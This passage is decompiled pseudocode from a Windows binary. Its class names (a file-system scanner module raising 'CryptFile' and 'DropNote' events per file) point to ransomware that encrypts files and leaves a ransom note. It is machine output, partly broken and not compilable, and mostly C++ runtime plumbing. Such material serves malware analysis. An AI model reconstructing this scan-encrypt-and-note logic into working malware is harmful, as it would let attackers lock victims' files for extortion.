          v3 = v27[0];
          goto LABEL_18;
        }
        v23 = (__PAIR64__(v20, v22) - v12) >> 32;
        v13 = v22 - v12;
        v14 = 100 * _Xtime_get_ticks();
        v24 = (double)__SPAIR64__(v23, v13) > 8.64e14;
        if ( (double)__SPAIR64__(v23, v13) <= 8.64e14 )
        {
          v15 = v23;
        }
        else
        {
          v13 = -1391067136;
          v15 = 201165;
        }
        v16 = __PAIR64__(v15, v13) + v14;
        v25 = v16 / 1000000000;
        v3 = v27[0];
        v26 = v16 % 1000000000;
        if ( !_Mtx_current_owns(v27[0]) )
          std::_Throw_Cpp_error(4);
        v4 = sub_42F839(v19, v3, (int)&v25);
        if ( v4 )
        {
          if ( v4 != 2 )
            goto LABEL_23;
          if ( !v24 )
            break;
        }
        if ( *((_DWORD *)this + 28) )
          goto LABEL_20;
      }
      if ( *((_DWORD *)this + 28) )
        goto LABEL_20;
LABEL_18:
      v5 = 1;
    }
  }
  v28 = 3;
  v17 = _Mtx_unlock(v3);
  if ( v17 )
    std::_Throw_C_error(v17);
  return v5;
}

//----- (00418180) --------------------------------------------------------
int __fastcall sub_418180(_DWORD *a1, _DWORD *a2, int a3)
{
  _DWORD *v3; // eax
  int v4; // esi
  _BYTE *v5; // edi
  _DWORD *v6; // ecx
  int v8; // [esp+10h] [ebp-10h]

  v3 = a2;
  v4 = a3;
  if ( a1 != a2 )
  {
    v5 = (_BYTE *)(a3 + 28);
    v8 = a3 - (_DWORD)a1;
    v6 = a1 + 6;
    do
    {
      *((_DWORD *)v5 - 3) = 0;
      *((_DWORD *)v5 - 2) = 0;
      *(_OWORD *)v4 = *(_OWORD *)(v6 - 6);
      *(_QWORD *)(v4 + 16) = *((_QWORD *)v6 - 1);
      *(v6 - 2) = 0;
      *(v6 - 1) = 7;
      *((_WORD *)v6 - 12) = 0;
      *(_DWORD *)((char *)v6 + v8) = 0;
      if ( (_DWORD *)((char *)v6 + v8) != v6 )
      {
        *(_DWORD *)((char *)v6 + v8) = *v6;
        v3 = a2;
        *v6 = 0;
      }
      v6 += 8;
      *v5 = 1;
      v4 += 32;
      v5 += 32;
    }
    while ( v6 - 6 != v3 );
  }
  return v4;
}

//----- (00418250) --------------------------------------------------------
void ***sub_418250()
{
  return &___R0_AV_lambda_1___4__OnScanFileSystem_ANFileSystemScannerModule__AAEX__QAUANIEvent___Z__8;
}
// 4FEB78: using guessed type void **___R0_AV_lambda_1___4__OnScanFileSystem_ANFileSystemScannerModule__AAEX__QAUANIEvent___Z__8;

//----- (00418260) --------------------------------------------------------
void __thiscall sub_418260(int *this, _DWORD *Src)
{
  int v3; // esi
  int *v4; // edi
  int v5; // eax
  void (__thiscall *v6)(int *, int *); // esi
  int v7[4]; // [esp+10h] [ebp-68h] BYREF
  int v8[6]; // [esp+20h] [ebp-58h] BYREF
  int v9[4]; // [esp+38h] [ebp-40h] BYREF
  _DWORD v10[7]; // [esp+48h] [ebp-30h] BYREF
  char v11; // [esp+64h] [ebp-14h]
  int v12; // [esp+74h] [ebp-4h]

  if ( Src[4] )
  {
    v3 = sub_417830(this[1], (int)Src);
    if ( v3 )
    {
      v9[1] = 0;
      v9[2] = 6;
      v9[3] = 33;
      v12 = 0;
      v9[0] = (int)&ANEventCryptFile::`vftable';
      sub_4055B0(v10, Src);
      v10[6] = v3;
      v11 = 0;
      v12 = 1;
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)this[1] + 4))(this[1], v9);
      if ( v11 )
      {
        v4 = (int *)this[1];
        v5 = *v4;
        v7[1] = 0;
        v7[2] = 2;
        v7[3] = 9;
        v6 = *(void (__thiscall **)(int *, int *))(v5 + 4);
        LOBYTE(v12) = 2;
        v7[0] = (int)&ANEventDropNote::`vftable';
        sub_4055B0(v8, Src);
        LOBYTE(v12) = 3;
        v6(v4, v7);
        sub_414BC0(v7);
      }
      sub_414F40(v9);
    }
  }
}
// 4B1614: using guessed type void *ANEventCryptFile::`vftable';
// 4B169C: using guessed type void *ANEventDropNote::`vftable';
// 418260: using guessed type int var_58[6];

//----- (00418370) --------------------------------------------------------
_DWORD *__thiscall sub_418370(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = ___7___Func_impl_no_alloc_V_lambda_1___4__OnScanFileSystem_ANFileSystemScannerModule__AAEX__QAUANIEvent___Z_X__QBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___std__6B_;
  a2[1] = this[1];
  return result;
}
// 4B15F8: using guessed type int (__stdcall *___7___Func_impl_no_alloc_V_lambda_1___4__OnScanFileSystem_ANFileSystemScannerModule__AAEX__QAUANIEvent___Z_X__QBV__basic_string__WU__char_traits__W_std__V__allocator__W_2__std___std__6B_[2])(int);

//----- (00418390) --------------------------------------------------------
void ***sub_418390()
{
  return &std::_Binder<std::_Unforced,void (__thiscall ANFileSystemScannerModule::*)(ANIEvent &&),ANFileSystemScannerModule *,std::_Ph<1> const &> `RTTI Type Descriptor';
}
// 4FEB00: using guessed type void **std::_Binder<std::_Unforced,void (__thiscall ANFileSystemScannerModule::*)(ANIEvent &&),ANFileSystemScannerModule *,std::_Ph<1> const &> `RTTI Type Descriptor';

//----- (004183A0) --------------------------------------------------------
int __thiscall sub_4183A0(int this, int a2)
{
  int result; // eax

  result = a2;
  *(_DWORD *)a2 = &std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANFileSystemScannerModule::*)(ANIEvent &&),ANFileSystemScannerModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';
  *(_DWORD *)(a2 + 4) = *(_DWORD *)(this + 4);
  *(_BYTE *)(a2 + 8) = *(_BYTE *)(this + 8);
  *(_DWORD *)(a2 + 12) = *(_DWORD *)(this + 12);
  return result;
}
// 4B16A4: using guessed type void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANFileSystemScannerModule::*)(ANIEvent &&),ANFileSystemScannerModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';

//----- (004183D0) --------------------------------------------------------
int __thiscall sub_4183D0(int this, _DWORD *a2)
{
  int *v3; // edi
  int *v4; // eax
  int v5; // ecx
  int *v6; // eax
  int v7; // ecx
  int v8; // edx
  volatile signed __int32 *v9; // edi
  volatile signed __int32 *v10; // edi
  int result; // eax
  int v12; // [esp-30h] [ebp-5Ch]
  _BYTE v13[12]; // [esp-20h] [ebp-4Ch] BYREF
  int v14; // [esp-14h] [ebp-40h]
  int v15; // [esp-10h] [ebp-3Ch]
  int v16; // [esp-Ch] [ebp-38h]
  int v17; // [esp-8h] [ebp-34h]
  __int16 v18; // [esp-4h] [ebp-30h]
  volatile signed __int32 *v19; // [esp+14h] [ebp-18h]
  _BYTE *v20; // [esp+18h] [ebp-14h]
  int v21; // [esp+1Ch] [ebp-10h]
  int v22; // [esp+28h] [ebp-4h]

  v21 = this;
  sub_418520((_DWORD *)this, a2);
  v22 = 0;
  v3 = (int *)(this + 168);
  *(_DWORD *)this = &std::_Task_async_state<void>::`vftable';
  *(_DWORD *)(this + 168) = 0;
  *(_DWORD *)(this + 172) = 0;
  LOBYTE(v22) = 1;
  v4 = (int *)sub_406770();
  v5 = v4[1];
  if ( v5 )
  {
    _InterlockedIncrement((volatile signed __int32 *)(v5 + 4));
    v5 = v4[1];
  }
  v12 = *v4;
  LOBYTE(v22) = 3;
  v20 = v13;
  unknown_libname_8(v12, v5, v12, 0);
  v15 = 0;
  v16 = 0;
  v17 = 0;
  v14 = 0;
  v13[8] = 0;
  v18 = 0;
  LOBYTE(v22) = 1;
  v6 = (int *)sub_418670(this);
  if ( v3 != v6 )
  {
    v7 = *v6;
    v8 = v6[1];
    *v6 = 0;
    v6[1] = 0;
    *v3 = v7;
    v9 = *(volatile signed __int32 **)(this + 172);
    *(_DWORD *)(this + 172) = v8;
    if ( v9 )
    {
      if ( !_InterlockedExchangeAdd(v9 + 1, 0xFFFFFFFF) )
      {
        (**(void (__thiscall ***)(volatile signed __int32 *))v9)(v9);
        if ( !_InterlockedExchangeAdd(v9 + 2, 0xFFFFFFFF) )
          (*(void (__thiscall **)(volatile signed __int32 *))(*v9 + 4))(v9);
      }
    }
  }
  v10 = v19;
  if ( v19 )
  {
    if ( !_InterlockedExchangeAdd(v19 + 1, 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(volatile signed __int32 *))v10)(v10);
      if ( !_InterlockedDecrement(v10 + 2) )
        (*(void (__thiscall **)(volatile signed __int32 *))(*v10 + 4))(v10);
    }
  }
  result = this;
  *(_BYTE *)(this + 118) = 1;
  return result;
}
// 42F174: using guessed type int __cdecl unknown_libname_8(_DWORD, _DWORD, _DWORD, _DWORD);
// 49DE2C: using guessed type void *std::_Task_async_state<void>::`vftable';

//----- (00418520) --------------------------------------------------------
int __thiscall sub_418520(_DWORD *this, _DWORD *a2)
{
  int v2; // ebx
  int v3; // eax
  void ***v4; // esi
  void **v6; // [esp+18h] [ebp-48h] BYREF
  void **v7; // [esp+1Ch] [ebp-44h]
  void **v8; // [esp+20h] [ebp-40h]
  void **v9; // [esp+24h] [ebp-3Ch]
  _DWORD Src[6]; // [esp+28h] [ebp-38h] BYREF
  void **v11; // [esp+40h] [ebp-20h]
  void **v12; // [esp+44h] [ebp-1Ch]
  _DWORD *v13; // [esp+48h] [ebp-18h]
  _DWORD *v14; // [esp+4Ch] [ebp-14h]
  void ***v15; // [esp+50h] [ebp-10h]
  int v16; // [esp+5Ch] [ebp-4h]

  v2 = (int)this;
  v14 = this;
  v13 = this;
  *this = &std::_Associated_state<int>::`vftable';
  this[1] = 1;
  __ExceptionPtrCreate(this + 3);
  _Mtx_init_in_situ((_Mtx_t)(v2 + 20), 2);
  sub_42F834(v2 + 68);
  *(_BYTE *)(v2 + 108) = 0;
  *(_DWORD *)(v2 + 112) = 0;
  *(_WORD *)(v2 + 116) = 0;
  *(_BYTE *)(v2 + 118) = 0;
  *(_DWORD *)(v2 + 120) = 0;
  v16 = 0;
  *(_DWORD *)v2 = &std::_Packaged_state<void __cdecl (void)>::`vftable';
  v2 += 128;
  v15 = &v6;
  v7 = (void **)a2[1];
  v8 = (void **)a2[2];
  v3 = a2[3];
  v13 = (_DWORD *)v2;
  v9 = (void **)v3;
  LOBYTE(v16) = 1;
  v6 = &ANEventScanFileSystem::`vftable';
  sub_4055B0(Src, a2 + 4);
  v11 = (void **)a2[10];
  v12 = (void **)a2[11];
  *(_DWORD *)(v2 + 36) = 0;
  LOBYTE(v16) = 3;
  v4 = (void ***)operator new(0x34u);
  v15 = v4;
  *v4 = &std::_Func_impl_no_alloc<std::_Fake_no_copy_callable_adapter<void (__thiscall ANFileSystemScannerModule::*)(ANIEvent &&),ANFileSystemScannerModule *,ANEventScanFileSystem>,void,>::`vftable';
  v4[1] = &ANIEvent::`vftable';
  v4[2] = v7;
  v4[3] = v8;
  v4[4] = v9;
  LOBYTE(v16) = 5;
  v4[1] = &ANEventScanFileSystem::`vftable';
  sub_4055B0(v4 + 5, Src);
  v4[11] = v11;
  v4[12] = v12;
  *(_DWORD *)(v2 + 36) = v4;
  sub_414980(&v6);
  return (int)v14;
}
// 42F834: using guessed type _DWORD __cdecl sub_42F834(_DWORD);
// 49DD98: using guessed type void *std::_Packaged_state<void __cdecl (void)>::`vftable';
// 49DE10: using guessed type void *std::_Associated_state<int>::`vftable';
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B1630: using guessed type void *ANEventScanFileSystem::`vftable';
// 4B1640: using guessed type void *std::_Func_impl_no_alloc<std::_Fake_no_copy_callable_adapter<void (__thiscall ANFileSystemScannerModule::*)(ANIEvent &&),ANFileSystemScannerModule *,ANEventScanFileSystem>,void,>::`vftable';
// 418520: using guessed type _DWORD Src[6];

//----- (00418670) --------------------------------------------------------
_QWORD *sub_418670(int a1, ...)
{
  int v1; // ecx
  _QWORD *v2; // esi
  void *v3; // edx
  void *Block[4]; // [esp+8h] [ebp-20h] BYREF
  int v6; // [esp+18h] [ebp-10h]
  int v7; // [esp+24h] [ebp-4h]
  void *retaddr; // [esp+2Ch] [ebp+4h]
  int v9; // [esp+34h] [ebp+Ch] BYREF
  va_list va; // [esp+34h] [ebp+Ch]
  int v11; // [esp+38h] [ebp+10h]
  int v12; // [esp+3Ch] [ebp+14h]
  int v13; // [esp+40h] [ebp+18h]
  int v14; // [esp+44h] [ebp+1Ch]
  int v15; // [esp+48h] [ebp+20h]
  int v16; // [esp+4Ch] [ebp+24h]
  va_list va1; // [esp+50h] [ebp+28h] BYREF

  va_start(va1, a1);
  va_start(va, a1);
  v9 = va_arg(va1, _DWORD);
  v11 = va_arg(va1, _DWORD);
  v12 = va_arg(va1, _DWORD);
  v13 = va_arg(va1, _DWORD);
  v14 = va_arg(va1, _DWORD);
  v15 = va_arg(va1, _DWORD);
  v16 = va_arg(va1, _DWORD);
  v2 = (_QWORD *)v1;
  v6 = v1;
  v7 = 1;
  memset(&Block[1], 0, 12);
  Block[0] = retaddr;
  LOBYTE(v16) = 1;
  sub_4072C0((unsigned int *)va1, (unsigned int *)Block);
  LOBYTE(v7) = 0;
  v3 = Block[1];
  if ( Block[1] )
  {
    if ( ((Block[3] - Block[1]) & 0xFFFFFFFC) >= 0x1000 )
    {
      v3 = (void *)*((_DWORD *)Block[1] - 1);
      if ( (unsigned int)(Block[1] - v3 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v3);
  }
  *v2 = 0i64;
  sub_4187E0((int)v2, a1, (int)va);
  sub_407DF0((int *)va);
  return v2;
}
// 418696: variable 'v1' is possibly undefined

//----- (00418750) --------------------------------------------------------
_DWORD *__thiscall sub_418750(_DWORD *this, _DWORD *a2)
{
  *this = &ANIEvent::`vftable';
  this[1] = a2[1];
  this[2] = a2[2];
  this[3] = a2[3];
  *this = &ANEventScanFileSystem::`vftable';
  sub_4055B0(this + 4, a2 + 4);
  this[10] = a2[10];
  this[11] = a2[11];
  return this;
}
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B1630: using guessed type void *ANEventScanFileSystem::`vftable';

//----- (004187E0) --------------------------------------------------------
int __thiscall sub_4187E0(int this, int a2, int a3)
{
  volatile signed __int32 *v4; // edi
  int v5; // eax
  int v6; // eax
  unsigned int *v7; // edx
  int v8; // eax
  char *v9; // ecx
  char v10; // al
  void *v11; // ecx
  void *v12; // ecx
  _DWORD *v13; // edi
  int v14; // eax
  char *v15; // ecx
  unsigned int v17; // [esp+Ch] [ebp-40h] BYREF
  void *v18; // [esp+10h] [ebp-3Ch]
  int v19; // [esp+18h] [ebp-34h]
  volatile signed __int32 *v20; // [esp+1Ch] [ebp-30h]
  int v21; // [esp+20h] [ebp-2Ch]
  void *Block[4]; // [esp+24h] [ebp-28h] BYREF
  _DWORD *v23; // [esp+34h] [ebp-18h]
  int v24; // [esp+38h] [ebp-14h]
  char *v25; // [esp+3Ch] [ebp-10h]
  int v26; // [esp+48h] [ebp-4h]
  void *retaddr; // [esp+50h] [ebp+4h]

  v21 = this;
  v25 = 0;
  v24 = a3;
  *(_DWORD *)this = 0;
  *(_DWORD *)(this + 4) = 0;
  v26 = 0;
  v4 = *(volatile signed __int32 **)(a3 + 12);
  if ( v4 )
    _InterlockedIncrement(v4 + 1);
  v20 = v4;
  LOBYTE(v26) = 1;
  v5 = (int)v4;
  if ( !v4 )
    v5 = 2;
  v25 = (char *)v5;
  v6 = *(_DWORD *)(a3 + 4);
  if ( v6 )
    _InterlockedIncrement((volatile signed __int32 *)(v6 + 4));
  sub_4096F0((char **)this, (int)v25, *(_QWORD *)a3, *(_DWORD *)(a3 + 8));
  LOBYTE(v26) = 2;
  if ( v4 && !_InterlockedDecrement(v4 + 1) )
    (*(void (__thiscall **)(volatile signed __int32 *))(*v4 + 4))(v4);
  LOBYTE(v26) = 0;
  if ( *(_BYTE *)(v24 + 24) )
  {
    v7 = sub_407250(&v17, (unsigned int *)(v24 + 28));
    LOBYTE(v26) = 3;
    v8 = 1;
  }
  else
  {
    memset(&Block[1], 0, 12);
    Block[0] = retaddr;
    v7 = (unsigned int *)Block;
    v26 = 4;
    v8 = 2;
  }
  v9 = *(char **)this;
  v25 = (char *)v8;
  v24 = v8;
  sub_4072C0((unsigned int *)v9 + 46, v7);
  v26 = 3;
  v10 = v24;
  if ( (v24 & 2) != 0 )
  {
    v11 = Block[1];
    v10 = v24 & 0xFD;
    v24 &= ~2u;
    if ( Block[1] )
    {
      if ( (unsigned int)(4 * ((Block[3] - Block[1]) >> 2)) >= 0x1000 )
      {
        v11 = (void *)*((_DWORD *)Block[1] - 1);
        if ( (unsigned int)(Block[1] - v11 - 4) > 0x1F )
          goto LABEL_26;
      }
      sub_44775B(v11);
      v10 = v24;
    }
  }
  v26 = 0;
  if ( (v10 & 1) != 0 )
  {
    v12 = v18;
    if ( v18 )
    {
      if ( (unsigned int)(4 * ((v19 - (int)v18) >> 2)) < 0x1000
        || (v12 = (void *)*((_DWORD *)v18 - 1), (unsigned int)((_BYTE *)v18 - (_BYTE *)v12 - 4) <= 0x1F) )
      {
        sub_44775B(v12);
        goto LABEL_23;
      }
LABEL_26:
      _invalid_parameter_noinfo_noreturn();
    }
  }
LABEL_23:
  *(_BYTE *)(*(_DWORD *)this + 8) = 0;
  *(_BYTE *)(*(_DWORD *)this + 9) = 0;
  nullsub_1(0);
  v25 = *(char **)this;
  v13 = operator new(0x10u);
  v23 = v13;
  *v13 = &___7___PPLTaskHandle_EU___InitialTaskHandle_XV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___3__Z_U_TypeSelectorNoAsync_details_Concurrency_____task_E_Concurrency__U_TaskProcHandle_details_3__details_Concurrency__6B_;
  v13[1] = 0;
  v13[2] = 0;
  v14 = *(_DWORD *)(this + 4);
  if ( v14 )
    _InterlockedIncrement((volatile signed __int32 *)(v14 + 4));
  v15 = v25;
  v13[1] = *(_DWORD *)this;
  v13[2] = *(_DWORD *)(this + 4);
  *v13 = &___7___InitialTaskHandle_XV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___3__Z_U_TypeSelectorNoAsync_details_Concurrency_____task_E_Concurrency__6B_;
  v13[3] = a2;
  sub_4078B0(v15, (int)v13, 0);
  return this;
}
// 409260: using guessed type _DWORD __stdcall nullsub_1(_DWORD);
// 4B15EC: using guessed type int (__thiscall *___7___InitialTaskHandle_XV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___3__Z_U_TypeSelectorNoAsync_details_Concurrency_____task_E_Concurrency__6B_)(void *Block, char);
// 4B1624: using guessed type int (__thiscall *___7___PPLTaskHandle_EU___InitialTaskHandle_XV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___3__Z_U_TypeSelectorNoAsync_details_Concurrency_____task_E_Concurrency__U_TaskProcHandle_details_3__details_Concurrency__6B_)(void *Block, char);

//----- (00418A40) --------------------------------------------------------
void __thiscall sub_418A40(_DWORD *Block, char a2)
{
  sub_414980(Block + 1);
  if ( a2 )
    sub_44775B(Block);
}

//----- (00418A70) --------------------------------------------------------
void ***sub_418A70()
{
  return &std::_Fake_no_copy_callable_adapter<void (__thiscall ANFileSystemScannerModule::*)(ANIEvent &&),ANFileSystemScannerModule *,ANEventScanFileSystem> `RTTI Type Descriptor';
}
// 4FEA78: using guessed type void **std::_Fake_no_copy_callable_adapter<void (__thiscall ANFileSystemScannerModule::*)(ANIEvent &&),ANFileSystemScannerModule *,ANEventScanFileSystem> `RTTI Type Descriptor';

//----- (00418A80) --------------------------------------------------------
int __thiscall sub_418A80(int this)
{
  return (*(int (__thiscall **)(_DWORD, int))(this + 48))(*(_DWORD *)(this + 44), this + 4);
}

//----- (00418A90) --------------------------------------------------------
#error "418A93: call analysis failed (funcsize=2)"

//----- (00418AC0) --------------------------------------------------------
void __thiscall __noreturn sub_418AC0(void *this, int a2, int a3)
{
  void *v4; // edx
  _DWORD *v5; // eax
  void *v6; // [esp-4h] [ebp-1Ch]

  sub_404A10(0x34u);
  v6 = sub_40C330(this);
  v5 = operator new(0x34u, v4);
  sub_418DF0(v5, v6);
}
// 418B07: variable 'v4' is possibly undefined

//----- (00418B20) --------------------------------------------------------
int __thiscall sub_418B20(_DWORD *this)
{
  int v2; // ecx
  int result; // eax
  char v4; // bl
  char *v5; // eax
  int v6[10]; // [esp-28h] [ebp-84h] BYREF
  int v7; // [esp+0h] [ebp-5Ch] BYREF
  char v8[36]; // [esp+10h] [ebp-4Ch] BYREF
  char *v9; // [esp+34h] [ebp-28h]
  int v10; // [esp+40h] [ebp-1Ch]
  int v11; // [esp+44h] [ebp-18h]
  _DWORD *v12; // [esp+48h] [ebp-14h]
  int *v13; // [esp+4Ch] [ebp-10h]
  int v14; // [esp+58h] [ebp-4h]

  v13 = &v7;
  v2 = this[1];
  v12 = this;
  if ( !(unsigned __int8)sub_40C2A0(v2) )
    return (*(int (__stdcall **)(int, _DWORD, _DWORD, int))(*(_DWORD *)this[1] + 4))(1, 0, 0, this[1] + 12);
  v14 = 0;
  v11 = this[1];
  sub_407D00(
    (int)___7___Func_impl_no_alloc_V_lambda_1___1_____0V___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___3__Z_X__V_std__6B_,
    this[3],
    v6[2],
    v6[3],
    v6[4],
    v6[5],
    v6[6],
    v6[7],
    v6[8],
    v6);
  LOBYTE(v14) = 1;
  v10 = this[1] + 200;
  LOBYTE(v14) = 2;
  if ( !v9 )
    std::_Xbad_function_call();
  v4 = (*(int (__thiscall **)(char *))(*(_DWORD *)v9 + 8))(v9);
  LOBYTE(v14) = 0;
  if ( v9 )
  {
    v5 = v8;
    LOBYTE(v5) = v9 != v8;
    (*(void (__stdcall **)(char *))(*(_DWORD *)v9 + 16))(v5);
    v9 = 0;
  }
  result = sub_40A0F0(v11, v4);
  v14 = -1;
  return result;
}
// 40F6A0: using guessed type _DWORD _guard_check_icall_nop();
// 4B1664: using guessed type int (__stdcall *___7___Func_impl_no_alloc_V_lambda_1___1_____0V___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___3__Z_X__V_std__6B_[2])(int);

//----- (00418CB0) --------------------------------------------------------
_DWORD *__thiscall sub_418CB0(_DWORD *Block, char a2)
{
  volatile signed __int32 *v3; // edi

  *Block = &___7___PPLTaskHandle_EU___InitialTaskHandle_XV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___3__Z_U_TypeSelectorNoAsync_details_Concurrency_____task_E_Concurrency__U_TaskProcHandle_details_3__details_Concurrency__6B_;
  v3 = (volatile signed __int32 *)Block[2];
  if ( v3 )
  {
    if ( !_InterlockedExchangeAdd(v3 + 1, 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(volatile signed __int32 *))v3)(v3);
      if ( !_InterlockedDecrement(v3 + 2) )
        (*(void (__thiscall **)(volatile signed __int32 *))(*v3 + 4))(v3);
    }
  }
  *Block = &Concurrency::details::_TaskProcHandle::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 40F6A0: using guessed type _DWORD _guard_check_icall_nop();
// 49DE5C: using guessed type void *Concurrency::details::_TaskProcHandle::`vftable';
// 4B1624: using guessed type int (__thiscall *___7___PPLTaskHandle_EU___InitialTaskHandle_XV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___3__Z_U_TypeSelectorNoAsync_details_Concurrency_____task_E_Concurrency__U_TaskProcHandle_details_3__details_Concurrency__6B_)(void *Block, char);

//----- (00418D50) --------------------------------------------------------
_DWORD *__thiscall sub_418D50(_DWORD *Block, char a2)
{
  volatile signed __int32 *v3; // edi

  *Block = &___7___PPLTaskHandle_EU___InitialTaskHandle_XV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___3__Z_U_TypeSelectorNoAsync_details_Concurrency_____task_E_Concurrency__U_TaskProcHandle_details_3__details_Concurrency__6B_;
  v3 = (volatile signed __int32 *)Block[2];
  if ( v3 )
  {
    if ( !_InterlockedExchangeAdd(v3 + 1, 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(volatile signed __int32 *))v3)(v3);
      if ( !_InterlockedDecrement(v3 + 2) )
        (*(void (__thiscall **)(volatile signed __int32 *))(*v3 + 4))(v3);
    }
  }
  *Block = &Concurrency::details::_TaskProcHandle::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 40F6A0: using guessed type _DWORD _guard_check_icall_nop();
// 49DE5C: using guessed type void *Concurrency::details::_TaskProcHandle::`vftable';
// 4B1624: using guessed type int (__thiscall *___7___PPLTaskHandle_EU___InitialTaskHandle_XV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___3__Z_U_TypeSelectorNoAsync_details_Concurrency_____task_E_Concurrency__U_TaskProcHandle_details_3__details_Concurrency__6B_)(void *Block, char);

//----- (00418DF0) --------------------------------------------------------
void __thiscall __noreturn sub_418DF0(_DWORD *this, void *a2)
{
  void *v2; // eax

  *this = &std::_Func_impl_no_alloc<std::_Fake_no_copy_callable_adapter<void (__thiscall ANFileSystemScannerModule::*)(ANIEvent &&),ANFileSystemScannerModule *,ANEventScanFileSystem>,void,>::`vftable';
  v2 = sub_40C330(a2);
  sub_418E20(v2);
}
// 4B1640: using guessed type void *std::_Func_impl_no_alloc<std::_Fake_no_copy_callable_adapter<void (__thiscall ANFileSystemScannerModule::*)(ANIEvent &&),ANFileSystemScannerModule *,ANEventScanFileSystem>,void,>::`vftable';

//----- (00418E20) --------------------------------------------------------
void __cdecl __noreturn sub_418E20(void *a1)
{
  _DWORD *v1; // eax
  _DWORD *v2; // edx
  int v3; // ecx

  v1 = sub_40C330(a1);
  sub_418750(v2, v1);
  terminate(v3);
}
// 418E34: variable 'v2' is possibly undefined
// 418E39: variable 'v3' is possibly undefined
// 46203B: using guessed type void __thiscall __noreturn terminate(_DWORD);

//----- (00418E40) --------------------------------------------------------
void ***sub_418E40()
{
  return &___R0_AV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___2__Z__8;
}
// 4FE948: using guessed type void **___R0_AV_lambda_1___1_____0V___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___2__Z__8;

//----- (00418E50) --------------------------------------------------------
_DWORD *__thiscall sub_418E50(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = ___7___Func_impl_no_alloc_V_lambda_1___1_____0V___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___3__Z_X__V_std__6B_;
  a2[1] = this[1];
  return result;
}
